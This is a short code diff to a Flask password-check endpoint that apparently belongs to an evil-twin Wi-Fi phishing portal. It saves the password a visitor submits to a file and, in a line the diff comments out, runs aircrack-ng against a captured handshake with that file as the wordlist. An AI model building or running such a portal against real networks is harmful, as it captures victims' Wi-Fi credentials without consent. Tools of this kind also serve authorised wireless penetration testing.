@@ -35,13 +35,17 @@ def index():
 def check_password():
     user_input = request.json['password']
 
+    # Save user input to the file
     with open("output.txt", "w") as file:
         file.write(user_input)
 
     # Uncomment the line below to run aircrack-ng with EvilTwin capabilities
-    subprocess.run(["aircrack-ng", "MyHandShake.cap", "-w", "output.txt"])
+    # subprocess.run(["aircrack-ng", "MyHandShake.cap", "-w", "output.txt"])
 
-    if user_input == "your_expected_password":
+    # Placeholder for correct password (replace this with your actual password)
+    correct_password = "your_expected_password"
+
+    if user_input == correct_password:
         message = "Correct password :D"
     else:
         message = "Incorrect password! Please try again."
